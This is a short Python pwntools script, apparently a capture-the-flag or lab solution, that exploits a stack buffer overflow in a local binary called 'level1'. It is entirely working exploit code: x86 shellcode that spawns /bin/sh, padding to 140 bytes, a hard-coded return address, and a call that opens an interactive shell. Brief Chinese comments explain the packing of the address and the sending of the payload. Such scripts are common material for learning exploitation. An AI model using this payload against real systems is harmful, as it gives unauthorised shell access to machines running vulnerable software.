#!/usr/bin/env python
# -*- coding:utf-8 -*-
from pwn import *

p = process('./level1') 
#p = remote('127.0.0.1',10001)

#ret = 0xbffff290
ret = 0xffffd4e0 #local address
#ret = 0xffffd430 #sonat address

shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += b"\x0b\xcd\x80"

# p32(ret) == struct.pack("<I",ret) 
#对ret进行编码，将地址转换成内存中的二进制存储形式
payload = shellcode + b'A' * (140 - len(shellcode)) + p32(ret)

p.send(payload) #发送payload

p.interactive()  #开启交互shell
